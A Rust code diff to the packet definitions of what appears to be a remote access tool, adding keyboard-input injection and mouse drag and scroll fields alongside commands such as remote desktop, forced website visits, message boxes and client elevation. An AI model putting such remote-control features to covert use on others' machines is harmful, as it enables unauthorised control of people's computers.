@@ -85,6 +85,7 @@ pub enum ClientboundPacket {
     StartRemoteDesktop(RemoteDesktopConfig),
     StopRemoteDesktop,
     MouseClick(MouseClickData),
+    KeyboardInput(KeyboardInputData),
     VisitWebsite(VisitWebsiteData),
     ShowMessageBox(MessageBoxData),
     ElevateClient,
@@ -133,6 +134,7 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::StartRemoteDesktop(_) => "StartRemoteDesktop",
             ClientboundPacket::StopRemoteDesktop => "StopRemoteDesktop",
             ClientboundPacket::MouseClick(_) => "MouseClick",
+            ClientboundPacket::KeyboardInput(_) => "KeyboardInput",
             ClientboundPacket::VisitWebsite(_) => "VisitWebsite",
             ClientboundPacket::ShowMessageBox(_) => "ShowMessageBox",
             ClientboundPacket::ElevateClient => "ElevateClient",
@@ -172,10 +174,12 @@ pub struct RemoteDesktopFrame {
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
 pub struct MouseClickData {
-    pub click_type: i32,
+    pub click_type: i32,  // 0 for left, 1 for middle, 2 for right, 3 for scroll
     pub display: i32,
     pub x: i32,
     pub y: i32,
+    pub action_type: i32, // 0 for click (down+up), 1 for mouse down, 2 for mouse up, 3 for mouse move during drag, 4 for scroll up, 5 for scroll down
+    pub scroll_amount: i32, // Amount to scroll (only used when click_type is 3)
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
@@ -213,4 +217,14 @@ pub struct File {
 pub struct FileData {
     pub name: String,
     pub data: Vec<u8>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct KeyboardInputData {
+    pub key_code: u32,       // Virtual key code
+    pub character: String,   // Printable character
+    pub is_keydown: bool,    // True for key down, false for key up
+    pub shift_pressed: bool, // Shift modifier state
+    pub ctrl_pressed: bool,  // Ctrl modifier state
+    pub caps_lock: bool,     // Caps lock state
 }
